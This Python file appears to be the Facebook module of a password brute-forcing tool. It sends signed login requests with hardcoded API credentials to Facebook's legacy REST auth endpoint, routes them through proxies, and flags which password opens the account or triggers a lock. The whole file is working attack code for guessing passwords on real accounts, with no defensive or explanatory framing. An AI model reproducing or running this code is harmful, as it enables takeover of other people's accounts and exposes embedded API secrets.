import hashlib
from time import time
from requests import Session
from lib.const import response_codes, debug, fetch_time


class FacebookBrowser(object):
    account_exists = None
    API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"

    def __init__(self, username, password, proxy):
        self.proxy = proxy
        self.is_found = False
        self.is_active = True
        self.is_locked = False
        self.start_time = None
        self.browser = self.br()
        self.username = username
        self.password = password
        self.is_attempted = False

    def br(self):
        session = Session()
        session.proxies.update(self.proxy.addr if self.proxy else [])
        return session

    def check_exists(self, response):
        pass  # TODO

    def check_response(self, response):
        ok_error_codes = ['', None, 405]  # TODO?
        if 'error_code' in response and response['error_code'] not in ok_error_codes:
            return response_codes['failed']
        else:
            return response_codes['succeed']

    def authenicate(self):
        response = self.post_data()
        resp = {'attempted': False, 'accessed': False, 'locked': False}

        if debug:
            print('pass: {} => {}'.format(self.password, response))

        if response:
            resp['attempted'] = True
            resp_code = self.check_response(response)

            if resp_code == response_codes['locked']:
                resp['locked'] = True

            if resp_code == response_codes['succeed']:
                resp['accessed'] = True

            if FacebookBrowser.account_exists == None:
                self.check_exists(response)

        return resp

    def attempt(self):  # the only one public func
        self.start_time = time()
        resp = self.authenicate()

        if resp['attempted']:
            self.is_attempted = True

            if not resp['locked']:
                if resp['accessed']:
                    self.is_found = True
            else:
                self.is_locked = True
        self.close()

    def close(self):
        self.is_active = False

    def post_data(self):
        sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={}return_ssl_resources=0v=1.0{}"\
            .format(self.username, self.password, FacebookBrowser.API_SECRET)

        xx = hashlib.md5(sig.encode()).hexdigest()
        data = "api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password={}&return_ssl_resources=0&v=1.0&sig={}"\
            .format(self.username, self.password, xx)

        response = None
        try:
            response = self.browser.get("https://api.facebook.com/restserver.php?{}".format(data), timeout=fetch_time).json()
        except:
            pass
        finally:
            return response
